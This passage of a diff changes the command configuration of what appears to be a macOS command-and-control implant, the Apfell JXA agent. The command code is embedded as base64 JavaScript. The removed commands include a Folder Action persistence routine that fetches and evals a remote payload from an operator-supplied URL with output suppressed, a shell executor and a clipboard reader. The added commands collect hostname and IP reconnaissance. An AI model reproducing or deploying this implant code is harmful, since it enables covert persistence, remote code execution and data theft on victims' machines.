sKICAgICAgICAgICAgbGV0IHBiID0gJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQ7CiAgICAgICAgICAgIGxldCBvdXRwdXQgPSBwYi5zdHJpbmdGb3JUeXBlKCQuTlNQYXN0ZWJvYXJkVHlwZVN0cmluZykuanM7CiAgICAgICAgICAgIC8vdmFyIG91dHB1dCA9IGN1cnJlbnRBcHAudGhlQ2xpcGJvYXJkKCk7CiAgICAgICAgICAgIGlmKG91dHB1dCA9PT0gIiIgfHwgb3V0cHV0ID09PSB1bmRlZmluZWQpewogICAgICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJOb3RoaW5nIG9uIHRoZSBjbGlwYm9hcmQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBTdHJpbmcob3V0cHV0KSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH0KICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
-            }
-          ],
-          "transforms": []
         },
         {
           "needs_admin": false,
@@ -2119,128 +2260,59 @@
         },
         {
           "needs_admin": false,
-          "help_cmd": "persist_folderaction {\"folder\": \"\/path\/to\/folder\", \"script_path\": \"\/path\/to\/script\/to\/put\/on\/disk.scpt\", \"url\": \"http:\/\/url.of.hosted\/payload\"}",
+          "help_cmd": "hostname",
           "version": 1,
           "is_exit": false,
           "is_file_browse": false,
-          "file_browse_parameters": "",
+          "file_browse_parameters": "*",
           "is_process_list": false,
           "process_list_parameters": "",
           "is_download_file": false,
-          "download_file_parameters": "",
+          "download_file_parameters": "*",
           "is_remove_file": false,
-          "remove_file_parameters": "",
+          "remove_file_parameters": "*",
           "is_agent_generator": false,
           "author": "",
           "deleted": false,
-          "description": "Use Folder Actions to persist a compiled script on disk. You can either specify a 'URL' and automatically do a backgrounding one-liner, or supply your own code and language.",
-          "cmd": "persist_folderaction",
-          "parameters": [
-            {
-              "type": "Choice",
-              "hint": "",
-              "choices": "JavaScript\nAppleScript",
-              "required": false,
-              "name": "language"
-            },
-            {
-              "type": "String",
-              "hint": "\/path\/to\/script\/to\/create\/on\/disk",
-              "choices": "",
-              "required": true,
-              "name": "script_path"
-            },
-            {
-              "type": "String",
-              "hint": "\/path\/to\/folder\/to\/watch",
-              "choices": "",
-              "required": true,
-              "name": "folder"
-            },
-            {
-              "type": "String",
-              "hint": "http:\/\/url.of.hosted\/payload",
-              "choices": "",
-              "required": false,
-              "name": "url"
-            },
-            {
-              "type": "String",
-              "hint": "osascript code",
-              "choices": "",
-              "required": false,
-              "name": "code"
-            }
-          ],
+          "description": "Get the various hostnames associated with the host, including the NETBIOS name if the computer is domain joined",
+          "cmd": "hostname",
+          "parameters": [],
           "attack": [],
           "artifacts": [],
           "files": [
             {
-              "persist_folderaction.js": "ZXhwb3J0cy5wZXJzaXN0X2ZvbGRlcmFjdGlvbiA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAJLy8gPT09PT09PSBHZXQgcGFyYW1zID09PT09PT09CiAgICAJbGV0IGpzb25fcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgCWxldCBmb2xkZXIgPSBqc29uX3BhcmFtc1snZm9sZGVyJ107CiAgICAJbGV0IHNjcmlwdF9wYXRoID0ganNvbl9wYXJhbXNbJ3NjcmlwdF9wYXRoJ107CiAgICAJbGV0IHVybCA9IGpzb25fcGFyYW1zWyd1cmwnXTsKICAgIAlsZXQgY29kZSA9IGpzb25fcGFyYW1zWydjb2RlJ107CiAgICAJbGV0IGxhbmcgPSBqc29uX3BhcmFtc1snbGFuZ3VhZ2UnXTsKICAgIAlsZXQgY29kZTEgPSAidmFyIGFwcCA9IEFwcGxpY2F0aW9uLmN1cnJlbnRBcHBsaWNhdGlvbigpO1xuIiArCiAgICAgICAgICAgICAgICAgICAgImFwcC5pbmNsdWRlU3RhbmRhcmRBZGRpdGlvbnMgPSB0cnVlO1xuIiArCiAgICAgICAgICAgICAgICAgICAgImFwcC5kb1NoZWxsU2NyaXB0KFwiIG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0IC1lIFxcXCJldmFsKE9iakMudW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoJC5OU0RhdGEuZGF0YVdpdGhDb250ZW50c09mVVJMKCQuTlNVUkwuVVJMV2l0aFN0cmluZygnIjsKCQlsZXQgY29kZTIgPSAiJykpLCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpKSk7XFxcIiAmPiAvZGV2L251bGwgJlwiKTsiOwoJCWxldCBvdXRwdXQgPSAiIjsKICAgIAkvLyA9PT09PT09PSBDb21waWxlIGFuZCB3cml0ZSBzY3JpcHQgdG8gZmlsZSA9PT09PT09PT09CiAgICAJT2JqQy5pbXBvcnQoJ09TQUtpdCcpOwogICAgCWxldCBteWxhbmcgPSAiIjsKICAgIAlsZXQgbXlzY3JpcHQgPSAiIjsKICAgIAlpZihjb2RlICE9PSAiIil7CiAgICAJCW15bGFuZyA9ICQuT1NBTGFuZ3VhZ2UubGFuZ3VhZ2VGb3JOYW1lKGxhbmcpOwogICAgCQlteXNjcmlwdCA9ICQuT1NBU2NyaXB0LmFsbG9jLmluaXRXaXRoU291cmNlTGFuZ3VhZ2UoJChjb2RlKSxteWxhbmcpOwogICAgCX1lbHNlewogICAgCQlteWxhbmcgPSAkLk9TQUxhbmd1YWdlLmxhbmd1YWdlRm9yTmFtZSgiSmF2YVNjcmlwdCIpOwogICAgCQlteXNjcmlwdCA9ICQuT1NBU2NyaXB0LmFsbG9jLmluaXRXaXRoU291cmNlTGFuZ3VhZ2UoJChjb2RlMSArIHVybCArIGNvZGUyKSxteWxhbmcpOwogICAgCX0KCgkJbXlzY3JpcHQuY29tcGlsZUFuZFJldHVybkVycm9yKCQoKSk7CgkJbGV0IGRhdGEgPSBteXNjcmlwdC5jb21waWxlZERhdGFGb3JUeXBlVXNpbmdTdG9yYWdlT3B0aW9uc0Vycm9yKCJvc2FzIiwgMHgwMDAwMDAwMywgJCgpKTsKCQlkYXRhLndyaXRlVG9GaWxlQXRvbWljYWxseShzY3JpcHRfcGF0aCwgdHJ1ZSk7CgkJLy8gPT09PT09PSBIYW5kbGUgdGhlIGZvbGRlciBhY3Rpb24gcGVyc2lzdGVuY2UgPT09PT09PQogICAgICAgIGxldCBzZSA9IEFwcGxpY2F0aW9uKCJTeXN0ZW0gRXZlbnRzIik7CgkJc2UuZm9sZGVyQWN0aW9uc0VuYWJsZWQgPSB0cnVlOwoJCWxldCBmYV9leGlzdHMgPSBmYWxzZTsKCQlsZXQgc2NyaXB0X2V4aXN0cyA9IGZhbHNlOwoJCWxldCBteVNjcmlwdCA9IHNlLlNjcmlwdCh7bmFtZTogc2NyaXB0X3BhdGguc3BsaXQoIi8iKS5wb3AoKSwgcG9zaXhQYXRoOiBzY3JpcHRfcGF0aH0pOwoJCWxldCBmYSA9IHNlLkZvbGRlckFjdGlvbih7bmFtZTogZm9sZGVyLnNwbGl0KCIvIikucG9wKCksIHBhdGg6IGZvbGRlcn0pOwoJCS8vIGZpcnN0IGNoZWNrIHRvIHNlZSBpZiB0aGVyZSdzIGEgZm9sZGVyIGFjdGlvbiBmb3IgdGhlIHBhdGggd2UncmUgbG9va2luZyBhdAoJCWZvcihsZXQgaSA9IDA7IGkgPCBzZS5mb2xkZXJBY3Rpb25zLmxlbmd0aDsgaSsrKXsKCQkJaWYoc2UuZm9sZGVyQWN0aW9uc1tpXS5wYXRoKCkgPT09IGZvbGRlcil7CgkJCQkvLyBpZiBvdXIgZm9sZGVyIGFscmVhZHkgaGFzIGZvbGRlciBhY3Rpb25zLCBqdXN0IHRha2UgdGhlIHJlZmVyZW5jZSBmb3IgbGF0ZXIKCQkJCWZhID0gc2UuZm9sZGVyQWN0aW9uc1tpXTsKCQkJCWZhX2V4aXN0cyA9IHRydWU7CgkJCQlvdXRwdXQgKz0gIkZvbGRlciBhbHJlYWR5IGhhcyBmb2xkZXIgYWN0aW9uc1xuIjsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCS8vIGlmIHRoZSBmb2xkZXIgYWN0aW9uIGRvZXNuJ3QgZXhpc3QsIGFkZCBpdAoJCWlmKGZhX2V4aXN0cyA9PT0gZmFsc2UpewoJCQlzZS5mb2xkZXJBY3Rpb25zLnB1c2goZmEpOwoJCX0KCQkvLyBDaGVjayB0byBzZWUgaWYgdGhpcyBzY3JpcHQgYWxyZWFkeSBleGlzdHMgb24gdGhpcyBmb2xkZXIKCQlmb3IobGV0IGkgPSAwOyBpIDwgZmEuc2NyaXB0cy5sZW5ndGg7IGkrKyl7CgkJCWlmKGZhLnNjcmlwdHNbaV0ucG9zaXhQYXRoKCkgPT09ICBzY3JpcHRfcGF0aCl7CgkJCQlzY3JpcHRfZXhpc3RzID0gdHJ1ZTsKCQkJCW91dHB1dCArPSAiU2NyaXB0IGFscmVhZHkgYXNzaWduZWQgdG8gdGhpcyBmb2xkZXJcbiI7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlpZihzY3JpcHRfZXhpc3RzID09PSBmYWxzZSl7CgkJCWZhLnNjcmlwdHMucHVzaChteVNjcmlwdCk7CgkJfQoJCW91dHB1dCArPSAiRm9sZGVyIEFjdGlvbiBlc3RhYmxpc2hlZCI7CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOm91dHB1dCwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
+              "hostname.js": "ZXhwb3J0cy5ob3N0bmFtZSA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CglsZXQgb3V0cHV0ID0ge307CglvdXRwdXRbJ2xvY2FsaXplZCddID0gT2JqQy5kZWVwVW53cmFwKCQuTlNIb3N0LmN1cnJlbnRIb3N0LmxvY2FsaXplZE5hbWUpOwoJb3V0cHV0WyduYW1lcyddID0gT2JqQy5kZWVwVW53cmFwKCQuTlNIb3N0LmN1cnJlbnRIb3N0Lm5hbWVzKTsKCWxldCBmaWxlTWFuYWdlciA9ICQuTlNGaWxlTWFuYWdlci5kZWZhdWx0TWFuYWdlcjsKCWlmKGZpbGVNYW5hZ2VyLmZpbGVFeGlzdHNBdFBhdGgoIi9MaWJyYXJ5L1ByZWZlcmVuY2VzL1N5c3RlbUNvbmZpZ3VyYXRpb24vY29tLmFwcGxlLnNtYi5zZXJ2ZXIucGxpc3QiKSl7CgkJbGV0IGRpY3QgPSAkLk5TTXV0YWJsZURpY3Rpb25hcnkuYWxsb2MuaW5pdFdpdGhDb250ZW50c09mRmlsZSgiL0xpYnJhcnkvUHJlZmVyZW5jZXMvU3lzdGVtQ29uZmlndXJhdGlvbi9jb20uYXBwbGUuc21iLnNlcnZlci5wbGlzdCIpOwoJCWxldCBjb250ZW50cyA9IE9iakMuZGVlcFVud3JhcChkaWN0KTsKCQlvdXRwdXRbJ0xvY2FsIEtlcmJlcm9zIFJlYWxtJ10gPSBjb250ZW50c1snTG9jYWxLZXJiZXJvc1JlYWxtJ107CgkJb3V0cHV0WydORVRCSU9TIE5hbWUnXSA9IGNvbnRlbnRzWydOZXRCSU9TTmFtZSddOwoJCW91dHB1dFsnU2VydmVyIERlc2NyaXB0aW9uJ10gPSBjb250ZW50c1snU2VydmVyRGVzY3JpcHRpb24nXTsKCX0KCXJldHVybiB7InVzZXJfb3V0cHV0IjogSlNPTi5zdHJpbmdpZnkob3V0cHV0LCBudWxsLCAyKSwgImNvbXBsZXRlZCI6IHRydWV9Owp9OwpDT01NQU5EX0VORFNfSEVSRQogICAg"
             }
           ],
           "transforms": []
         },
         {
           "needs_admin": false,
-          "help_cmd": "shell {command}",
-          "version": 3,
+          "help_cmd": "ifconfig",
+          "version": 1,
           "is_exit": false,
           "is_file_browse": false,
-          "file_browse_parameters": "",
+          "file_browse_parameters": "*",
           "is_process_list": false,
           "process_list_parameters": "",
           "is_download_file": false,
-          "download_file_parameters": "",
+          "download_file_parameters": "*",
           "is_remove_file": false,
-          "remove_file_parameters": "",
+          "remove_file_parameters": "*",
           "is_agent_generator": false,
           "author": "",
           "deleted": false,
-          "description": "This runs {command} in a terminal by leveraging JXA's Application.doShellScript({command}).\n\nWARNING! THIS IS SINGLE THREADED, IF YOUR COMMAND HANGS, THE AGENT HANGS!",
-          "cmd": "shell",
-          "parameters": [
-            {
-              "type": "String",
-              "hint": "",
-              "choices": "",
-              "required": true,
-              "name": "command"
-            }
-          ],
-          "attack": [
-            {
-              "t_num": "T1059",
-              "attack_name": "Command-Line Interface"
-            }
-          ],
-          "artifacts": [
-            {
-              "command_parameter": "command",
-              "artifact": "Process Create",
-              "artifact_string": "sh -c *",
-              "replace_string": "*"
-            }
-          ],
+          "description": "List out the current IP addresses",
+          "cmd": "ifconfig",
+          "parameters": [],
+          "attack": [],
+          "artifacts": [],
           "files": [
             {
-              "shell.js": "ZXhwb3J0cy5zaGVsbCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CgkvL3NpbXBseSBydW4gYSBzaGVsbCBjb21tYW5kIHZpYSBkb1NoZWxsU2NyaXB0IGFuZCByZXR1cm4gdGhlIHJlc3BvbnNlCglsZXQgcmVzcG9uc2UgPSAiIjsKCXRyeXsKCQlsZXQgY29tbWFuZF9wYXJhbXMgPSBKU09OLnBhcnNlKHBhcmFtcyk7CgkJbGV0IGNvbW1hbmQgPSBjb21tYW5kX3BhcmFtc1snY29tbWFuZCddOwoJICAgIGlmKGNvbW1hbmRbY29tbWFuZC5sZW5ndGgtMV0gPT09ICImIil7CgkgICAgICAgIC8vZG9TaGVsbFNjcmlwdCBhY3R1YWxseSBkb2VzIG1hY09TJyAvYmluL3NoIHdoaWNoIGlzIGFjdHVhbGx5IGJhc2ggZW11bGF0aW5nIHNoCgkgICAgICAgIC8vICBzbyB0byBhY3R1YWxseSBiYWNrZ3JvdW5kIGEgdGFzaywgeW91IG5lZWQgIiY+IC9kZXYvbnVsbCAmIiBhdCB0aGUgZW5kCgkgICAgICAgIC8vICBzbyBJJ2xsIGp1c3QgYXV0b21hdGljYWxseSBmaXggdGhpcyBzbyBpdCdzIG5vdCB3ZWlyZCBmb3IgdGhlIG9wZXJhdG9yCgkgICAgICAgIGNvbW1hbmQgPSBjb21tYW5kICsgIj4gL2Rldi9udWxsICYiOwoJICAgIH0KCQlyZXNwb25zZSA9IGN1cnJlbnRBcHAuZG9TaGVsbFNjcmlwdChjb21tYW5kKTsKCQlpZihyZXNwb25zZSA9PT0gdW5kZWZpbmVkIHx8IHJlc3BvbnNlID09PSAiIil7CgkJICAgIHJlc3BvbnNlID0gIk5vIENvbW1hbmQgT3V0cHV0IjsKCQl9CgkJLy8gc2hlbGwgb3V0cHV0IHVzZXMgXHIgaW5zdGVhZCBvZiBcbiBvciBcclxuIHRvIGxpbmUgZW5kaW5ncywgZml4IHRoaXMgbm9uc2Vuc2UKCQlyZXNwb25zZSA9IHJlc3BvbnNlLnJlcGxhY2UoL1xyL2csICJcbiIpOwoJCXJldHVybiB7InVzZXJfb3V0cHV0IjpyZXNwb25zZSwgImNvbXBsZXRlZCI6IHRydWV9OwoJfQoJY2F0Y2goZXJyb3IpewoJCXJlc3BvbnNlID0gZXJyb3IudG9TdHJpbmcoKS5yZXBsYWNlKC9cci9nLCAiXG4iKTsKCQlyZXR1cm4geyJ1c2VyX291dHB1dCI6cmVzcG9uc2UsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07Cgl9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
+              "ifconfig.js": "ZXhwb3J0cy5pZmNvbmZpZyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IEpTT04uc3RyaW5naWZ5KE9iakMuZGVlcFVud3JhcCgkLk5TSG9zdC5jdXJyZW50SG9zdC5hZGRyZXNzZXMpLCBudWxsLCAyKSwgImNvbXBsZXRlZCI6IHRydWV9Owp9OwpDT01NQU5EX0VORFNfSEVSRQo="
             }
           ],
-          "transforms": [
-            {
-              "order": 1,
-              "parameter": "command",
-              "active": true,
-              "description": "",
-              "timestamp": "03\/20\/2020 01:02:00",
-              "command": "shell",
-              "command_id": 58,
-              "payload_type": "apfell-jxa",
-              "transform": "jsonSingleParameter",
-              "parameter_type": "String"
-            }
-          ]
+          "transforms": []
         }
       ]
     }
